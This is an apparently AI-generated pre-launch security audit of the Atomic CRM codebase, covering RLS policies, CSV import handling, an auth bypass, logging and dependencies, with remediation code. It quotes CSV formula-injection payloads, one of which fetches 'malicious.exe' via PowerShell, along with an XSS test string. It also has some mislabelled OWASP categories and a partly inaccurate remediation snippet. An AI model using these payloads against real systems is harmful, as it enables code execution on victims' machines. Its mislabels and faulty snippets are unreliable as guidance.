# Atomic CRM Security Vulnerability Assessment
**Assessment Date:** November 8, 2025  
**Scope:** Pre-launch security audit  
**Severity Levels:** Critical, High, Medium, Low

---

## CRITICAL VULNERABILITIES

### 1. Exposed Public Credentials in Version Control
**Severity:** CRITICAL  
**OWASP:** A01:2021 - Broken Access Control  
**Files:**
- `/home/krwhynot/projects/crispy-crm/.env.cloud` (Line 12)
- `/home/krwhynot/projects/crispy-crm/.env` (Line 12-13)

**Details:**
The Supabase **anonymous (public) API key** is committed to version control:
```
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

While technically this is the "anonymous key" (safe to expose per Supabase), it maps to your production Supabase project (`aaqnanddcqvfiwhshndl.supabase.co`). This means:
- Anyone with the repo can identify your Supabase project URL and anon key
- They can enumerate your schema and attempt RLS bypasses
- Project ID is visible in comments (line 25 of .env.cloud)

**Recommendation:**
1. Even though anonymous keys are public by design, consider using environment variables for ALL API endpoints
2. Document that .env.cloud should only contain anonymized/template values
3. Use a secrets manager (GitHub Secrets, CI/CD vars) for CI/CD deployments
4. Add clear comments in .env files about which values are safe

---

### 2. Permissive RLS Policies - Data Breach Risk
**Severity:** CRITICAL  
**OWASP:** A01:2021 - Broken Access Control  
**File:** `/home/krwhynot/projects/crispy-crm/supabase/migrations/20251018203500_update_rls_for_shared_team_access.sql`

**Details:**
All RLS policies use `USING (true)` for shared resources:
```sql
-- Line 18: Contacts
CREATE POLICY authenticated_select_contacts ON contacts
  FOR SELECT TO authenticated
  USING (true);  -- Everyone can see ALL contacts

-- Line 46: Organizations  
CREATE POLICY authenticated_select_organizations ON organizations
  FOR SELECT TO authenticated
  USING (true);  -- Everyone can see ALL organizations

-- Line 74: Opportunities
CREATE POLICY authenticated_select_opportunities ON opportunities
  FOR SELECT TO authenticated
  USING (true);  -- Everyone can see ALL opportunities
```

**Impact:**
- **Any authenticated user can access ALL customer data** regardless of role
- **DELETE policies allow anyone to delete any contact/opportunity**
- **No multi-tenancy isolation** if multiple clients/teams share an instance
- **No role-based access control (RBAC)** - admin/user distinction is client-side only

**Attack Scenario:**
1. User logs in with standard account
2. Can enumerate all customers and opportunities via API
3. Can export competitor data
4. Can delete critical records for sabotage

**Recommendation:**
Implement proper RLS policies:
```sql
-- Example for multi-tenant isolation
CREATE POLICY select_team_contacts ON contacts
  FOR SELECT TO authenticated
  USING (
    -- Only see contacts from my team/company
    team_id IN (
      SELECT team_id FROM sales WHERE user_id = auth.uid()
    )
  );

-- For role-based access
CREATE POLICY delete_own_entries ON contacts
  FOR DELETE TO authenticated
  USING (
    -- Admins can delete anything, users only their own
    (SELECT is_admin FROM sales WHERE user_id = auth.uid()) = true
    OR created_by = auth.uid()
  );
```

---

### 3. CSV Upload Without File Type Validation
**Severity:** CRITICAL  
**OWASP:** A04:2021 - Insecure Deserialization  
**File:** `/home/krwhynot/projects/crispy-crm/src/atomic-crm/contacts/ContactImportDialog.tsx` (Line 562)

**Details:**
```jsx
<FileInput
  source="csv"
  label="CSV File"
  accept={{ "text/csv": [".csv"] }}  // Client-side only - can be bypassed
  onChange={handleFileChange}
>
```

**Issues:**
1. **Client-side MIME type check only** - attacker can:
   - Rename executable to `.csv`
   - Upload JSON with CSV extension
   - Send binary malicious files
   
2. **No file size limits** - allows:
   - DoS attacks via massive files
   - Memory exhaustion (Papa Parse buffers entire file)
   - CSV injection attacks (formula injection)

3. **Papa Parse configuration** (Line 316):
   ```tsx
   const { importer: previewImporter, parseCsv } = usePapaParse<ContactImportSchema>({
     onPreview: onPreview,
     previewRowCount: 100,
   });
   ```
   - No size limit specified
   - No encoding validation
   - Potential XXE vulnerabilities if XML parsing enabled

**Attack Scenario:**
```
1. Upload 1GB "CSV" file → Memory exhaustion, DoS
2. Upload formula: =cmd|'/c calc'!A0 → CSV injection
3. Upload HTML/JS as .csv → Browser parsing issues
```

**Recommendation:**
```typescript
// Add server-side validation
export async function validateCsvUpload(file: File): Promise<{ valid: boolean; error?: string }> {
  // 1. Size check
  const MAX_SIZE = 10 * 1024 * 1024; // 10MB
  if (file.size > MAX_SIZE) {
    return { valid: false, error: "File exceeds 10MB limit" };
  }

  // 2. MIME type validation (server-side)
  if (!file.type.includes('text/csv') && !file.name.endsWith('.csv')) {
    return { valid: false, error: "Only CSV files allowed" };
  }

  // 3. Content sniffing - read first bytes
  const chunk = await file.slice(0, 512).text();
  if (!isValidCsvHeader(chunk)) {
    return { valid: false, error: "Invalid CSV structure" };
  }

  // 4. Papa Parse with limits
  const parseConfig = {
    header: true,
    dynamicTyping: false, // Prevent formula evaluation
    skipEmptyLines: true,
    maxRowsToReturn: 10000, // Limit rows
  };

  return { valid: true };
}
```

---

## HIGH SEVERITY VULNERABILITIES

### 4. No CSRF Protection on State-Changing Operations
**Severity:** HIGH  
**OWASP:** A01:2021 - Broken Access Control  

**Details:**
- No CSRF tokens on forms (React admin handles some, but custom forms lack it)
- No SameSite cookie configuration visible in code
- Supabase session cookies not explicitly configured with SameSite

**Impact:**
- Attacker can trick user into:
  - Deleting contacts via malicious link
  - Creating fake opportunities
  - Bulk importing corrupted data

**Recommendation:**
Ensure Supabase client configured with:
```typescript
const supabase = createClient(url, key, {
  auth: {
    autoRefreshToken: true,
    persistSession: true,
    detectSessionInUrl: true
  }
  // Verify SameSite is enforced server-side
});
```

---

### 5. localStorage Used for Filter State Without Encryption
**Severity:** HIGH  
**OWASP:** A02:2021 - Cryptographic Failures  
**Files:**
- `/home/krwhynot/projects/crispy-crm/src/atomic-crm/filters/filterPrecedence.ts` (Lines 51, 63, 155)
- `/home/krwhynot/projects/crispy-crm/src/atomic-crm/filters/opportunityStagePreferences.ts` (Line 25, 49)

**Details:**
```typescript
// Line 51: Storing filter state in plain localStorage
const stored = localStorage.getItem(key);
localStorage.setItem(key, JSON.stringify(value));

// This persists user's filter preferences including:
// - Sales they're viewing
// - Opportunity stages they track
// - Personal data exposure on shared devices
```

**Impact:**
- On shared workstation: next user can see previous user's filter history
- Mobile device theft: localStorage persists without encryption
- XSS attack: malicious script can read all localStorage data

**Recommendation:**
```typescript
// Use sessionStorage for session-only data (auto-cleared on close)
const useSessionStorage = (key: string) => {
  // Use sessionStorage instead of localStorage for sensitive filters
  return sessionStorage.getItem(key);
};

// OR: Encrypt sensitive data before storing
import { AES } from 'crypto-js';
const encryptedFilter = AES.encrypt(JSON.stringify(filter), encryptionKey).toString();
localStorage.setItem(key, encryptedFilter);
```

---

### 6. Missing Authentication Checks in Routes
**Severity:** HIGH  
**OWASP:** A01:2021 - Broken Access Control  
**File:** `/home/krwhynot/projects/crispy-crm/src/atomic-crm/providers/supabase/authProvider.ts` (Lines 36-48)

**Details:**
```typescript
checkAuth: async (params) => {
  // Users are on the set-password page, nothing to do
  if (
    window.location.pathname === "/set-password" ||
    window.location.hash.includes("#/set-password")
  ) {
    return; // BYPASSES AUTH CHECK
  }
  // Users are on the forgot-password page, nothing to do
  if (
    window.location.pathname === "/forgot-password" ||
    window.location.hash.includes("#/forgot-password")
  ) {
    return; // BYPASSES AUTH CHECK
  }
  return baseAuthProvider.checkAuth(params);
}
```

**Issues:**
1. **URL-based bypass:** Attacker can navigate to `/set-password?next=/dashboard` to bypass auth
2. **Client-side validation:** URL check is client-side, easily spoofed
3. **No session validation:** After bypass, does user actually have valid session?

**Recommendation:**
```typescript
checkAuth: async (params) => {
  // Always check session first
  const { data: { session } } = await supabase.auth.getSession();
  
  if (!session) {
    // Redirect to login, except for specific public pages
    if (!isPublicPath(window.location.pathname)) {
      throw new Error('Not authenticated');
    }
  }
  
  return baseAuthProvider.checkAuth(params);
}

function isPublicPath(path: string): boolean {
  const publicPaths = ['/login', '/set-password', '/forgot-password'];
  return publicPaths.some(p => path.startsWith(p));
}
```

---

### 7. Environment Variable Exposure in Logs
**Severity:** HIGH  
**OWASP:** A02:2021 - Cryptographic Failures  
**File:** `/home/krwhynot/projects/crispy-crm/src/atomic-crm/providers/supabase/supabase.ts` (Lines 4-8)

**Details:**
```typescript
console.log('🔍 [SUPABASE INIT] Environment variables:', {
  VITE_SUPABASE_URL: import.meta.env.VITE_SUPABASE_URL,
  VITE_SUPABASE_ANON_KEY: import.meta.env.VITE_SUPABASE_ANON_KEY?.substring(0, 20) + '...',
  allEnv: import.meta.env, // LOGS ALL ENVIRONMENT VARIABLES
});
```

**Impact:**
- Full environment dumped to browser console
- Visible in Sentry/error monitoring logs
- Visible in GitHub Actions CI/CD logs if tests fail
- May include sensitive data if added to env

**Recommendation:**
```typescript
if (import.meta.env.DEV) {
  console.debug('[SUPABASE INIT] URL:', import.meta.env.VITE_SUPABASE_URL);
  // NEVER log full env or API keys
}

// Remove in production
if (process.env.NODE_ENV !== 'production') {
  console.log('...');
}
```

---

## MEDIUM SEVERITY VULNERABILITIES

### 8. Weak CSV Validation - Injection Attacks Possible
**Severity:** MEDIUM  
**OWASP:** A03:2021 - Injection  
**File:** `/home/krwhynot/projects/crispy-crm/src/atomic-crm/contacts/csvProcessor.ts`

**Details:**
```typescript
export function processCsvData(
  headers: string[],
  dataRows: any[][]
): ContactImportSchema[] {
  const transformedHeaders = transformHeaders(headers);

  return dataRows.map(row => {
    const contact: any = {};
    headers.forEach((originalHeader, index) => {
      const transformedHeader = transformedHeaders[index];
      const value = row[index]; // NO SANITIZATION
      
      if (transformedHeader === FULL_NAME_SPLIT_MARKER) {
        const { first_name, last_name } = splitFullName(value || '');
        // value could contain: ="malicious_formula"
      } else {
        contact[transformedHeader] = value; // STORED AS-IS
      }
    });
    return contact;
  });
}
```

**Attacks:**
- **CSV Injection:** `=cmd|'/c powershell wget malicious.exe'!A0`
- **Formula Bombs:** Cells starting with `=`, `+`, `-`, `@`
- **Script Injection:** `<script>alert('xss')</script>` in name fields

**Recommendation:**
```typescript
function sanitizeCsvValue(value: any): string {
  if (!value || typeof value !== 'string') return '';
  
  // Remove formula injection attempts
  if (/^[=+\-@]/.test(value.trim())) {
    return "'" + value; // Prepend quote to prevent formula evaluation
  }
  
  // Remove/escape HTML
  return value
    .replace(/[<>]/g, '') // Remove angle brackets
    .trim();
}

export function processCsvDataSecure(
  headers: string[],
  dataRows: any[][]
): ContactImportSchema[] {
  return dataRows.map(row => {
    const contact: any = {};
    headers.forEach((originalHeader, index) => {
      const value = sanitizeCsvValue(row[index]);
      contact[transformedHeader] = value;
    });
    return contact;
  });
}
```

---

### 9. No Rate Limiting on Import Operations
**Severity:** MEDIUM  
**OWASP:** A04:2021 - Insecure Deserialization  

**Details:**
Users can:
1. Upload 10,000-row CSV instantly
2. Trigger 100s of database operations
3. No throttling, no queue, no rate limits

**Impact:**
- DoS: User could saturate database with bulk imports
- Resource exhaustion: Memory spike during parsing
- No audit trail of how many imports run

**Recommendation:**
```typescript
// Add import rate limiting
const importQueue = new PQueue({ concurrency: 1 });
const importLimiter = new RateLimiter({ 
  maxRequests: 5, // 5 imports per day
  windowMs: 24 * 60 * 60 * 1000 
});

export async function importContacts(batch: ContactImportSchema[]) {
  if (!importLimiter.tryConsume()) {
    throw new Error('Import rate limit exceeded');
  }
  
  // Process via queue to prevent concurrent operations
  return importQueue.add(() => processBatch(batch));
}
```

---

### 10. Improper TypeScript `any` Types
**Severity:** MEDIUM  
**OWASP:** A05:2021 - Broken Access Control  
**Files:**
Multiple files use `any[]` and `any` types, bypassing type safety:
- `src/atomic-crm/organizations/OrganizationImportDialog.tsx:52` - `const [rawDataRows, setRawDataRows] = useState<any[]>`
- `src/components/admin/columns-button.tsx:10` - `// @ts-ignore`
- `src/atomic-crm/services/activities.service.ts:20` - `Promise<any[]>`

**Impact:**
- Runtime errors not caught at compile time
- Type coercion vulnerabilities
- SQLi/XSS easier to introduce

**Recommendation:**
```typescript
// Instead of any[]
interface RawDataRow {
  [key: string]: string | number | null;
}
const [rawDataRows, setRawDataRows] = useState<RawDataRow[]>([]);

// Type-safe with proper validation
type ContactImportRow = Readonly<ContactImportSchema>;
```

---

## LOW SEVERITY VULNERABILITIES

### 11. Environment Variables Not Validated at Startup
**Severity:** LOW  
**File:** `/home/krwhynot/projects/crispy-crm/src/atomic-crm/providers/supabase/supabase.ts`

**Details:**
```typescript
if (!import.meta.env.VITE_SUPABASE_URL) {
  console.error('❌ [SUPABASE INIT] VITE_SUPABASE_URL is not defined!');
  // Still continues, might crash later
}
```

**Recommendation:**
```typescript
const validateEnv = () => {
  const required = ['VITE_SUPABASE_URL', 'VITE_SUPABASE_ANON_KEY'];
  const missing = required.filter(key => !import.meta.env[key]);
  
  if (missing.length > 0) {
    throw new Error(`Missing required env vars: ${missing.join(', ')}`);
  }
};

validateEnv(); // Fail fast at startup
```

---

### 12. Production Console Logging Not Properly Disabled
**Severity:** LOW  
**File:** `/home/krwhynot/projects/crispy-crm/vite.config.ts` (Lines 237-239)

**Details:**
```typescript
compress: {
  drop_console: true,
  drop_debugger: true,
  pure_funcs: ["console.log", "console.info"],
},
```

While terser config is correct, some debug logs still appear in code.

**Recommendation:**
Use environment-aware logging:
```typescript
const log = {
  debug: (...args) => {
    if (import.meta.env.DEV) console.log(...args);
  }
};

log.debug('This only shows in development');
```

---

## DEPENDENCY VULNERABILITIES

### 13. Check for Outdated/Vulnerable Packages
**Severity:** HIGH (if vulnerable versions present)  

**Key Dependencies to Monitor:**
- `@supabase/supabase-js` - ^2.75.1 (Check for CVEs)
- `papaparse` - ^5.5.3 (CSV parsing - verify no injection vulnerabilities)
- `dompurify` - ^3.2.7 (Sanitization - keep updated)
- `react` - ^19.1.0 (Verify security patches)
- `zod` - ^4.0.5 (Validation - check for bypass vulnerabilities)

**Recommendation:**
```bash
npm audit
npm outdated
# Run regularly in CI/CD
```

---

## SUMMARY TABLE

| # | Vulnerability | Severity | OWASP | Status |
|---|---|---|---|---|
| 1 | Exposed API Keys in Repo | CRITICAL | A01 | Requires fix |
| 2 | Permissive RLS Policies | CRITICAL | A01 | Requires fix |
| 3 | CSV Upload File Validation | CRITICAL | A04 | Requires fix |
| 4 | CSRF Protection Missing | HIGH | A01 | Review needed |
| 5 | localStorage Unencrypted | HIGH | A02 | Requires fix |
| 6 | Auth Bypass in Routes | HIGH | A01 | Requires fix |
| 7 | Env Var Exposure in Logs | HIGH | A02 | Requires fix |
| 8 | CSV Injection Attacks | MEDIUM | A03 | Requires fix |
| 9 | No Rate Limiting | MEDIUM | A04 | Consider adding |
| 10 | Improper `any` Types | MEDIUM | A05 | Requires refactor |
| 11 | Env Validation at Startup | LOW | N/A | Nice to have |
| 12 | Console Logging in Prod | LOW | N/A | Nice to have |
| 13 | Dependency Vulnerabilities | HIGH | N/A | Monitor regularly |

---

## RECOMMENDED ACTIONS BEFORE LAUNCH

### IMMEDIATE (BLOCKING)
1. Implement proper RLS policies with role-based access control
2. Add server-side CSV file validation with size/content limits
3. Remove or encrypt stored credentials in version control
4. Implement CSRF tokens on all state-changing operations
5. Fix authentication route bypass vulnerability

### SHORT-TERM (BEFORE PRODUCTION)
6. Sanitize all CSV input to prevent injection attacks
7. Add rate limiting on import operations
8. Remove environment variable logging in production
9. Implement sessionStorage instead of localStorage for sensitive data
10. Add environment variable validation at startup
11. Refactor `any` types to specific interfaces

### ONGOING (SECURITY HYGIENE)
12. Set up automated dependency vulnerability scanning
13. Implement Content Security Policy headers (already partially done)
14. Add input validation middleware across all API calls
15. Implement audit logging for all data modifications
16. Regular security testing (SAST, DAST)

---

## NOTES

**Positive Security Findings:**
- Content Security Policy implemented in vite.config.ts
- DOMPurify library included for HTML sanitization
- Zod schemas used for validation at API boundary
- Supabase's native authentication (good foundation)
- Tests use service role only for setup, not client code

**Architecture Improvements Needed:**
- No clear separation of client/server code
- localStorage usage shows frontend doesn't have secure storage
- Service role key visible in test setup only (good), but could be more protected
- Missing audit trail for sensitive operations

---

**Generated:** November 8, 2025  
**Codebase:** Atomic CRM v0.1.0 (Pre-launch)
